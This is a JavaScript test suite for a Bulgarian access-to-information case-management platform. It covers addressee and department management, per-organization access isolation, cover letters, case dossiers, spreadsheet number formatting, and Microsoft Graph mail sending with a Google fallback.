  assert.equal(g.call('op.plan.save', { id: p.id, name: 'Основен', description: 'Описание', status: 'Въведен' }, op).ok, true);
  assert.equal(g.call('org.bootstrap', {}, a.token).plan.name, 'Основен');
  assert.equal(g.call('org.bootstrap', {}, b.token).plan, null, 'друга организация');
  assert.equal(g.call('case.create', caseData(), a.token).ok, true, 'планът не ограничава работата');
});

test('addressees: saved per organization, deduplicated, editable and deleted', () => {
  const { g, a, b } = setupTwo();
  const data = { type: 'Гражданин', name: 'Петър Петров', address: 'п.к. 1000, ул. Втора 2', email: '', phone: '0888' };
  assert.equal(g.call('addressees.save', { type: 'Гражданин', name: '', address: 'x' }, a.token).error, 'required');
  assert.equal(g.call('addressees.save', { type: 'Гражданин', name: 'Без контакт' }, a.token).error, 'required');
  assert.equal(g.call('addressees.save', { type: 'Друг', name: 'X', address: 'y' }, a.token).error, 'value');
  assert.equal(g.call('addressees.save', { type: 'Гражданин', name: 'X', email: 'лош' }, a.token).error, 'email');
  const r = g.call('addressees.save', data, a.token);
  assert.equal(r.ok, true, JSON.stringify(r));
  const again = g.call('addressees.save', data, a.token);
  assert.equal(again.existed, true);
  assert.equal(again.id, r.id);
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees.length, 1);
  assert.equal(g.call('org.bootstrap', {}, b.token).addressees.length, 0, 'друга организация не вижда адресатите');
  assert.equal(g.call('addressees.save', Object.assign({}, data, { id: r.id }), b.token).error, 'notfound');
  assert.equal(g.call('addressees.delete', { id: r.id }, b.token).error, 'notfound');
  assert.equal(g.call('addressees.save', Object.assign({}, data, { id: r.id, name: 'Петър Иванов' }), a.token).ok, true);
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees[0].name, 'Петър Иванов');
  const log = g.call('log.list', {}, a.token).log.filter(l => /адресат/i.test(l.action));
  assert.ok(log.length >= 2);
  assert.ok(log.every(l => !JSON.stringify(l).includes('Петър')), 'без лични данни в дневника');
  assert.equal(g.call('addressees.delete', { id: r.id }, a.token).ok, true);
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees.length, 0);
  assert.equal(g.call('addressees.delete', { id: r.id }, a.token).error, 'notfound');
});

test('new case can save the applicant as an addressee only when asked', () => {
  const { g, a } = setupTwo();
  assert.equal(g.call('case.create', caseData(), a.token).ok, true);
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees.length, 0);
  assert.equal(g.call('case.create', caseData({ saveAddressee: 'on' }), a.token).ok, true);
  const list = g.call('org.bootstrap', {}, a.token).addressees;
  assert.equal(list.length, 1);
  assert.equal(list[0].name, 'Петър Петров');
  assert.equal(list[0].oblast, 'София (столица)');
});

test('addressee rights follow the case rights', () => {
  const { g, a } = setupTwo();
  const inv = addStaff(g, a.token, 'emp1');
  g.call('activate', { no: inv[1], username: 'emp1', token: inv[3], hash: HASH('e') });
  const emp = g.call('login', { no: a.no, username: 'emp1', hash: HASH('e') }).token;
  const adminOwn = g.call('addressees.save', { type: 'Гражданин', name: 'На администратора', address: 'ул. А 1' }, a.token);
  const setPerms = perms => assert.equal(g.call('users.save', { username: 'emp1', name: 'Служител', position: 'Експерт', email: 'emp@example.org', role: 'Служител', perms }, a.token).ok, true);
  assert.equal(g.call('org.bootstrap', {}, emp).addressees.length, 1, 'с право за всички вижда всички');
  setPerms(['casesEdit']);
  assert.equal(g.call('org.bootstrap', {}, emp).addressees.length, 0, 'само своите');
  assert.equal(g.call('addressees.save', { id: adminOwn.id, type: 'Гражданин', name: 'Опит', address: 'ул. Б 2' }, emp).error, 'notfound');
  assert.equal(g.call('addressees.delete', { id: adminOwn.id }, emp).error, 'notfound');
  const own = g.call('addressees.save', { type: 'Гражданин', name: 'На служителя', address: 'ул. В 3' }, emp);
  assert.equal(own.ok, true);
  assert.equal(g.call('org.bootstrap', {}, emp).addressees.length, 1);
  setPerms(['casesAll']);
  assert.equal(g.call('addressees.save', { type: 'Гражданин', name: 'Нов', address: 'ул. Г 4' }, emp).error, 'role');
  assert.equal(g.call('addressees.delete', { id: own.id }, emp).error, 'role');
});

test('notifications carry the support address and reply to it', () => {
  const g = load(); operator(g);
  apply(g);
  const m = g.mails.find(x => x.to === 'obshtina@example.org');
  assert.equal(m.replyTo, 'support@platform.zdoi4you.eu');
  assert.ok(m.body.includes('support@platform.zdoi4you.eu'));
});

test('operator manages addressees of a chosen organization outside cases', () => {
  const { g, op, a, b } = setupTwo();
  const data = { no: a.no, type: 'Юридическо лице', name: 'Фирма', address: 'ул. Първа 1' };
  assert.equal(g.call('op.addressees', { no: a.no }, a.token).error, 'role');
  assert.equal(g.call('op.addressee.save', data, a.token).error, 'role');
  assert.equal(g.call('op.addressees', { no: '99999999' }, op).error, 'notfound');
  const r = g.call('op.addressee.save', data, op);
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees[0].name, 'Фирма', 'организацията го вижда');
  assert.equal(g.call('org.bootstrap', {}, b.token).addressees.length, 0, 'другата не го вижда');
  const own = g.call('addressees.save', { type: 'Гражданин', name: 'От организацията', email: 'x@example.org' }, a.token);
  assert.equal(g.call('op.addressees', { no: a.no }, op).addressees.length, 2, 'операторът вижда всички');
  assert.equal(g.call('op.addressees', { no: b.no }, op).addressees.length, 0);
  assert.equal(g.call('op.addressee.save', Object.assign({}, data, { no: b.no, id: r.id }), op).error, 'notfound', 'чужда организация');
  assert.equal(g.call('op.addressee.save', Object.assign({}, data, { id: r.id, name: 'Фирма 2' }), op).ok, true);
  assert.ok(g.call('org.bootstrap', {}, a.token).addressees.some(x => x.name === 'Фирма 2'));
  assert.equal(g.call('op.addressee.delete', { no: b.no, id: own.id }, op).error, 'notfound');
  assert.equal(g.call('op.addressee.delete', { no: a.no, id: own.id }, op).ok, true);
  assert.equal(g.call('op.addressees', { no: a.no }, op).addressees.length, 1);
  assert.ok(g.call('log.list', {}, a.token).log.some(l => l.action === 'Изтрит адресат' && /оператор/.test(l.actor)), 'записано в дневника на организацията');
});

const dept = (over = {}) => Object.assign({ name: 'Правен отдел', head: 'Анна Иванова', position: 'Началник', email: 'pravo@example.org' }, over);

test('departments: entered by those with the right, separate per organization', () => {
  const { g, op, a, b } = setupTwo();
  assert.equal(g.call('departments.save', dept({ name: '' }), a.token).error, 'required');
  assert.equal(g.call('departments.save', dept({ email: 'лош' }), a.token).error, 'email');
  const r = g.call('departments.save', dept(), a.token);
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(g.call('departments.save', dept({ name: 'правен отдел' }), a.token).error, 'duplicate');
  assert.equal(g.call('org.bootstrap', {}, a.token).departments[0].name, 'Правен отдел');
  assert.equal(g.call('org.bootstrap', {}, b.token).departments.length, 0);
  assert.equal(g.call('departments.save', dept({ id: r.id }), b.token).error, 'notfound');
  assert.equal(g.call('op.department.save', dept({ no: a.no, name: 'От оператор' }), op).ok, true);
  assert.equal(g.call('op.org.get', { no: a.no }, op).departments.length, 2);
  assert.equal(g.call('op.department.save', dept({ no: a.no }), a.token).error, 'role');
  const staff = staffWith(g, a.token, a.no, 'emp7').token;
  assert.equal(g.call('departments.save', dept({ name: 'Друг' }), staff).error, 'role', 'служител по подразбиране няма това право');
  const allowed = staffWith(g, a.token, a.no, 'emp8', ['departments']).token;
  assert.equal(g.call('departments.save', dept({ name: 'Друг' }), allowed).ok, true);
});

test('internal forms take the department from the list, not from the browser', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const dep = g.call('departments.save', dept(), a.token).id;
  const send = (fields, token = a.token, type = 'internalRequest') => g.call('doc.create', { type, regNo: reg, date: '2026-11-04', title: 'Вътрешно искане до отдел', fields }, token);
  assert.equal(send({ departmentId: 'липсва', what: 'x', by: '2026-11-10' }).error, 'department');
  assert.equal(send({ departmentId: dep, by: '2026-11-10' }).error, 'required');
  const other = g.call('departments.save', dept(), b.token).id;
  assert.equal(send({ departmentId: other, what: 'x', by: '2026-11-10' }).error, 'department', 'отдел на друга организация');
  const r = send({ departmentId: dep, what: 'Договорите', by: '2026-11-10', department: 'Подправен', departmentHead: 'Подправен' });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.ok(r.no.startsWith('ВТР-'));
  assert.equal(r.payload.f.department, 'Правен отдел');
  assert.equal(r.payload.f.departmentHead, 'Анна Иванова');
  const got = g.call('case.get', { regNo: reg }, a.token);
  assert.equal(got.case.status, 'Нова', 'статусът не се променя');
  assert.ok(got.events.some(e => e.text.includes('до Правен отдел') && e.text.includes('2026-11-10')));
  assert.equal(g.call('departments.save', dept({ id: dep, active: false }), a.token).ok, true);
  assert.equal(send({ departmentId: dep, what: 'x', by: '2026-11-10' }).error, 'department', 'неактивен отдел');
  const noLetters = staffWith(g, a.token, a.no, 'emp9', ['casesAll']).token;
  assert.equal(send({ departmentId: dep, what: 'x', by: '2026-11-10' }, noLetters).error, 'role');
});

test('forwarding letter requires attachments and does not change the case', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const base = { body: 'Агенция', bodyAddress: 'ул. Трета 3' };
  assert.equal(g.call('doc.create', { type: 'forwardBody', regNo: reg, date: '2026-11-04', fields: base }, a.token).error, 'required');
  const r = g.call('doc.create', { type: 'forwardBody', regNo: reg, date: '2026-11-04', title: 'Препращане', fields: Object.assign({ attachments: 'Заявление' }, base) }, a.token);
  assert.equal(r.ok, true, JSON.stringify(r));
  const c = g.call('case.get', { regNo: reg }, a.token).case;
  assert.equal(c.status, 'Нова');
  assert.equal(c.outcome, '');
});

test('cover letter: tied to a visible document, takes its data and needs no case of its own', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const src = g.call('doc.create', { type: 'noinfo', regNo: reg, date: '2026-11-04', title: 'Няма информация', fields: {} }, a.token);
  const cover = (over, token = a.token) => g.call('doc.create', { type: 'cover', ofId: src.id, date: '2026-11-05', fields: Object.assign({ toName: 'Петър Петров', attachments: 'Писмо' }, over) }, token);
  assert.equal(cover({ toName: '' }).error, 'required');
  assert.equal(cover({ attachments: '' }).error, 'required');
  assert.equal(cover({}, b.token).error, 'notfound', 'чужда организация');
  assert.equal(g.call('doc.create', { type: 'cover', ofId: 'липсва', fields: { toName: 'x', attachments: 'y' } }, a.token).error, 'notfound');
  const r = cover({ ofNo: 'Подправен', ofTitle: 'Подправен' });
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.payload.f.ofNo, src.no);
  assert.equal(r.payload.f.ofTitle, 'Няма информация');
  assert.equal(r.payload.case.regNo, reg);
  const list = g.call('case.get', { regNo: reg }, a.token);
  assert.ok(list.docs.some(d => d.type === 'cover' && d.title === 'Съпроводително писмо към № ' + src.no));
  assert.equal(list.case.outcome, 'Няма информация (чл. 33)', 'резултатът остава');
  assert.equal(g.call('doc.create', { type: 'cover', ofId: r.id, fields: { toName: 'x', attachments: 'y' } }, a.token).error, 'value');
  // към документ без преписка
  const rep = g.call('doc.create', { type: 'report', title: 'Отчет', date: '2026-11-04', fields: { year: '2026' } }, a.token);
  const rc = g.call('doc.create', { type: 'cover', ofId: rep.id, date: '2026-11-05', fields: { toName: 'Сметна палата', attachments: 'Отчет' } }, a.token);
  assert.equal(rc.ok, true, JSON.stringify(rc));
  assert.equal(rc.payload.case, undefined);
  assert.equal(g.call('doc.get', { id: rc.id }, a.token).ok, true);
  const noLetters = staffWith(g, a.token, a.no, 'emp6', ['casesAll', 'reports']).token;
  assert.equal(g.call('doc.create', { type: 'cover', ofId: rep.id, fields: { toName: 'x', attachments: 'y' } }, noLetters).error, 'role');
  assert.equal(g.call('doc.get', { id: rc.id }, noLetters).error, 'notfound');
});

test('signing method is limited to the known values and kept with the document', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const send = signMode => g.call('doc.create', { type: 'noinfo', regNo: reg, date: '2026-11-04', title: 'x', fields: { signMode } }, a.token);
  assert.equal(send('друг').error, 'value');
  assert.equal(send('').ok, true);
  const r = send('electronic');
  assert.equal(g.call('doc.get', { id: r.id }, a.token).payload.f.signMode, 'electronic');
});

test('leading zeros survive everywhere, including columns added to older sheets', () => {
  const { g, op, a } = setupTwo();
  const ZERO = '000696327';
  const orgBook = () => [...g.books.values()].find(x => x.name.includes(a.no));
  // старо състояние: лист без колона за ЕИК, както е създаден преди добавянето ѝ
  const old = orgBook().getSheetByName('Адресати');
  assert.ok(old === null || old.getLastRow() <= 1);
  const r0 = g.call('addressees.save', { type: 'Юридическо лице', name: 'Фирма', address: 'ул. А', eik: ZERO, phone: '0888123456' }, a.token);
  assert.equal(r0.ok, true, JSON.stringify(r0));
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees[0].eik, ZERO, 'нов запис');
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees[0].phone, '0888123456');
  const c = g.call('case.create', caseData({ applicantType: 'Юридическо лице', applicantEik: ZERO, applicantPhone: '0888000111' }), a.token);
  const got = g.call('case.get', { regNo: c.regNo }, a.token).case;
  assert.equal(got.applicantEik, ZERO);
  assert.equal(got.applicantPhone, '0888000111');
  assert.equal(g.call('op.org.get', { no: a.no }, op).profile.eik, '000696327', 'профил');
  // колона, останала без формат: загубените нули се връщат при първото отваряне
  const s = orgBook().getSheetByName('Адресати');
  const col = 11;
  s.formats = [{ r: 1, c: 1, nr: 1000, nc: col - 1 }];
  s.cells[1][col - 1] = 695114;
  g.ctx.resetHeaders();
  assert.equal(s.getRange(2, col).getNumberFormat(), '0');
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees[0].eik, '000695114', 'загубените нули са възстановени');
  assert.equal(s.getRange(2, col).getNumberFormat(), '@');
  assert.equal(s.cells[1][col - 1], '000695114', 'и в самата таблица');
  const again = g.call('addressees.save', { id: r0.id, type: 'Юридическо лице', name: 'Фирма', address: 'ул. А', eik: ZERO }, a.token);
  assert.equal(again.ok, true);
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees[0].eik, ZERO, 'следващите записи са текст');
  // дълъг номер
  s.formats = [{ r: 1, c: 1, nr: 1000, nc: col - 1 }];
  s.cells[1][col - 1] = 12345678901;
  g.ctx.resetHeaders();
  assert.equal(g.call('org.bootstrap', {}, a.token).addressees[0].eik, '0012345678901');
});

test('blank cover letter: no source document, with or without a case', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const fields = { toName: 'Сметна палата', attachments: 'Справка' };
  const withCase = g.call('doc.create', { type: 'cover', regNo: reg, date: '2026-11-05', title: 'Съпроводително писмо', fields }, a.token);
  assert.equal(withCase.ok, true, JSON.stringify(withCase));
  assert.equal(withCase.payload.case.regNo, reg);
  assert.ok(g.call('case.get', { regNo: reg }, a.token).docs.some(d => d.title === 'Съпроводително писмо'));
  const free = g.call('doc.create', { type: 'cover', date: '2026-11-05', title: 'Съпроводително писмо', fields }, a.token);
  assert.equal(free.ok, true, JSON.stringify(free));
  assert.equal(free.payload.case, undefined);
  assert.equal(g.call('doc.create', { type: 'cover', regNo: reg, fields }, b.token).error, 'notfound', 'чужда преписка');
  assert.equal(g.call('doc.create', { type: 'cover', ofId: 'липсва', fields }, a.token).error, 'notfound');
});

test('case dossier: returns the full file, respects visibility and leaves a trace', () => {
  const { g, a, b } = setupTwo();
  const reg = g.call('case.create', caseData({ applicantType: 'Юридическо лице', applicantEik: '000696327' }), a.token).regNo;
  g.call('case.comment', { regNo: reg, text: 'Вътрешна бележка' }, a.token);
  const doc = g.call('doc.create', { type: 'noinfo', regNo: reg, date: '2026-11-04', title: 'Няма информация', fields: {} }, a.token);
  const court = g.call('court.save', { regNo: reg, court: 'Съд', caseNo: '7', year: '2026', kind: 'Друго', status: 'Образувано' }, a.token);
  const content = '%PDF съдържание';
  const f1 = g.call('file.upload', { scope: 'case', ref: reg, name: 'Жалба.pdf', data: Buffer.from(content).toString('base64') }, a.token);
  g.call('file.upload', { scope: 'court', ref: court.id, name: 'Съд.pdf', data: Buffer.from('x').toString('base64') }, a.token);
  assert.equal(g.call('case.dossier', { regNo: reg }, b.token).error, 'notfound', 'друга организация');
  assert.equal(g.call('case.dossier', { regNo: 'липсва' }, a.token).error, 'notfound');
  const own = staffWith(g, a.token, a.no, 'own9', ['casesEdit']).token;
  assert.equal(g.call('case.dossier', { regNo: reg }, own).error, 'notfound', 'без право към преписката');
  const d = g.call('case.dossier', { regNo: reg }, a.token);
  assert.equal(d.ok, true, JSON.stringify(d));
  assert.equal(d.case.applicantEik, '000696327');
  assert.equal(d.docs.find(x => x.no === doc.no).payload.no, doc.no, 'пълен документ');
  assert.equal(d.files.length, 2);
  const expected = require('crypto').createHash('sha256').update(content).digest('hex');
  assert.equal(d.files.find(x => x.name === 'Жалба.pdf').sha256, expected, 'контролна сума на съдържанието');
  assert.equal(d.files.find(x => x.name === 'Съд.pdf').courtNo, '7/2026');
  assert.equal(JSON.stringify(d).includes('driveId'), false);
  assert.ok(d.events.some(e => e.text === 'Вътрешна бележка'));
  assert.equal(d.generatedBy, 'Мария Петрова');
  const trimmed = g.call('case.dossier', { regNo: reg, comments: false, fullDocs: false }, a.token);
  assert.ok(!trimmed.events.some(e => e.text === 'Вътрешна бележка'), 'без вътрешните коментари');
  assert.equal(trimmed.docs.find(x => x.no === doc.no).payload, null);
  assert.ok(g.call('case.get', { regNo: reg }, a.token).events.some(e => e.kind === 'Досие'), 'записано в историята');
  assert.ok(g.call('log.list', {}, a.token).log.some(l => l.action === 'Генерирано досие на преписка'));
  // файл отпреди контролните суми получава такава при първото досие
  const sheet = [...g.books.values()].find(x => x.name.includes(a.no)).getSheetByName('Файлове');
  sheet.cells[1][9] = '';
  assert.equal(g.call('case.dossier', { regNo: reg }, a.token).files.find(x => x.id === f1.id).sha256, expected);
  assert.equal(sheet.cells[1][9], expected);
});

test('department reply keeps the filled answers and is linked to the department', () => {
  const { g, a } = setupTwo();
  const reg = g.call('case.create', caseData(), a.token).regNo;
  const dep = g.call('departments.save', dept(), a.token).id;
  const r = g.call('doc.create', { type: 'internalReply', regNo: reg, date: '2026-11-06', title: 'Отговор на отдел', fields: { departmentId: dep, requestNo: 'ВТР-1', hasInfo: 'да', opinion: 'Становище', replyDate: '2026-11-06' } }, a.token);
  assert.equal(r.ok, true, JSON.stringify(r));
  assert.equal(r.payload.f.opinion, 'Становище');
  assert.equal(r.payload.f.department, 'Правен отдел');
  assert.ok(g.call('case.get', { regNo: reg }, a.token).events.some(e => e.text.includes('от Правен отдел')));
});

const MS_KEYS = require('crypto').generateKeyPairSync('rsa', { modulusLength: 2048, publicKeyEncoding: { type: 'spki', format: 'pem' }, privateKeyEncoding: { type: 'pkcs8', format: 'pem' } });
function microsoft(g, send) {
  g.props.set('MS_TENANT', 'tenant-id'); g.props.set('MS_CLIENT_ID', 'client-id'); g.props.set('MS_SENDER', 'no-reply@platform.zdoi4you.eu');
  g.props.set('MS_PRIVATE_KEY', MS_KEYS.privateKey); g.props.set('MS_CERT_SHA256', 'AA:BB:' + 'CC:'.repeat(29) + 'DD'); g.props.set('MS_CERT_SHA1', 'ff'.repeat(20));
  g.setFetch(url => (url.includes('login.microsoftonline.com') ? { code: 200, body: JSON.stringify({ access_token: 'token-1', expires_in: 3600 }) } : send(url)));
}

test('mail goes through Google until Microsoft 365 is configured', () => {
  const g = load(); operator(g);
  g.mails.length = 0;
  assert.equal(apply(g).ok, true);
  assert.equal(g.fetches.length, 0);
  assert.ok(g.mails.length > 0);
});

test('mail goes through Microsoft Graph from the configured mailbox, with reply-to and no sent copy', () => {
  const g = load(); operator(g);
  microsoft(g, () => ({ code: 202, body: '' }));
  g.mails.length = 0; g.fetches.length = 0;
  assert.equal(apply(g).ok, true);
  assert.equal(g.mails.length, 0, 'не минава през Google');
  const token = g.fetches.filter(f => f.url.includes('login.microsoftonline.com'));
  const sends = g.fetches.filter(f => f.url.includes('graph.microsoft.com'));
  assert.equal(token.length, 1, 'токенът се използва повторно');
  assert.ok(token[0].url.includes('/tenant-id/oauth2/v2.0/token'));
  assert.equal(token[0].opts.payload.grant_type, 'client_credentials');
  assert.equal(token[0].opts.payload.client_assertion_type, 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer');
  assert.equal(token[0].opts.payload.client_secret, undefined);
  const [h, c, sig] = token[0].opts.payload.client_assertion.split('.');
  const dec = s => JSON.parse(Buffer.from(s, 'base64url').toString('utf8'));
  assert.equal(dec(h).alg, 'RS256');
  assert.equal(dec(h)['x5t#S256'], Buffer.from('aabb' + 'cc'.repeat(29) + 'dd', 'hex').toString('base64url'), 'двоеточията в отпечатъка не пречат');
  assert.equal(dec(h).x5t, Buffer.from('ff'.repeat(20), 'hex').toString('base64url'));
  assert.ok(!/[+/=]/.test(h + c + sig), 'base64url без допълване');
  const claims = dec(c);
  assert.equal(claims.aud, 'https://login.microsoftonline.com/tenant-id/oauth2/v2.0/token');
  assert.equal(claims.iss, 'client-id'); assert.equal(claims.sub, 'client-id');
  assert.ok(claims.jti && claims.exp - claims.nbf === 300);
  assert.ok(require('crypto').createVerify('RSA-SHA256').update(h + '.' + c).verify(MS_KEYS.publicKey, Buffer.from(sig, 'base64url')), 'истински подпис');
  assert.ok(!JSON.stringify(g.fetches.map(f => f.opts)).includes(MS_KEYS.privateKey.split('\n')[1]), 'частният ключ не се изпраща');
  assert.ok(sends.length >= 1);
  assert.ok(sends[0].url.endsWith('/users/no-reply%40platform.zdoi4you.eu/sendMail'));
  assert.equal(sends[0].opts.headers.Authorization, 'Bearer token-1');
  const body = JSON.parse(sends[0].opts.payload);
  assert.equal(body.saveToSentItems, false, 'връзките не остават в кутията');
  assert.equal(body.message.toRecipients[0].emailAddress.address, 'obshtina@example.org');
  assert.equal(body.message.replyTo[0].emailAddress.address, 'support@platform.zdoi4you.eu');
  assert.ok(body.message.body.content.includes('БУЛАДМИН'));
});

test('if Microsoft refuses, the message still goes out through Google and the token is renewed', () => {
  const g = load(); operator(g);
  microsoft(g, () => ({ code: 403, body: JSON.stringify({ error: { code: 'ErrorAccessDenied', message: 'x' } }) }));
  g.mails.length = 0;
  assert.equal(apply(g).ok, true);
  assert.ok(g.mails.some(m => m.to === 'obshtina@example.org'), 'писмото не се губи');
  microsoft(g, () => ({ code: 401, body: '{}' }));
  g.fetches.length = 0;
  g.ctx.mail_('a@example.org', 'Тема', 'Текст');
  g.ctx.mail_('a@example.org', 'Тема', 'Текст');
  assert.equal(g.fetches.filter(f => f.url.includes('login.microsoftonline.com')).length, 1, 'след 401 токенът се иска наново');
  // ключ, чиито редове са се слели при поставяне в свойствата
  g.props.set('MS_PRIVATE_KEY', MS_KEYS.privateKey.replace(/\n/g, ' '));
  g.ctx.CacheService.getScriptCache().remove('ms:token');
  g.setFetch(url => (url.includes('login.microsoftonline.com') ? { code: 200, body: JSON.stringify({ access_token: 't', expires_in: 3600 }) } : { code: 202, body: '' }));
  g.mails.length = 0;
  assert.equal(g.ctx.mail_('c@example.org', 'Тема', 'Текст'), true);
  assert.equal(g.mails.length, 0, 'ключът се подрежда наново и подписът успява');
  g.setFetch(url => (url.includes('login.microsoftonline.com') ? { code: 401, body: JSON.stringify({ error: 'invalid_client', error_description: 'AADSTS700027: подробности' }) } : { code: 202, body: '' }));
  g.ctx.CacheService.getScriptCache().remove('ms:token');
  g.mails.length = 0;
  assert.equal(g.ctx.mail_('b@example.org', 'Тема', 'Текст'), true, 'изтекла тайна');
  assert.ok(g.mails.some(m => m.to === 'b@example.org'));
});

test('the connection check reports a missing configuration and never falls back to Google', () => {
  const g = load(); operator(g);
  assert.throws(() => g.ctx.msTest(), /Липсват свойства/);
  microsoft(g, () => ({ code: 403, body: JSON.stringify({ error: { code: 'ErrorAccessDenied' } }) }));
  g.mails.length = 0;
  assert.throws(() => g.ctx.msTest(), /403 ErrorAccessDenied/);
  assert.equal(g.mails.length, 0);
  microsoft(g, () => ({ code: 202, body: '' }));
  g.ctx.msTest();
  assert.equal(g.mails.length, 0);
});

test('a rejected certificate is reported with the Microsoft error code', () => {
  const g = load(); operator(g);
  microsoft(g, () => ({ code: 202, body: '' }));
  g.setFetch(() => ({ code: 401, body: JSON.stringify({ error: 'invalid_client', error_description: 'AADSTS700027: Client assertion failed signature validation. Trace ID: x' }) }));
  assert.throws(() => g.ctx.msTest(), /токен: 401 invalid_client AADSTS700027$/);
});
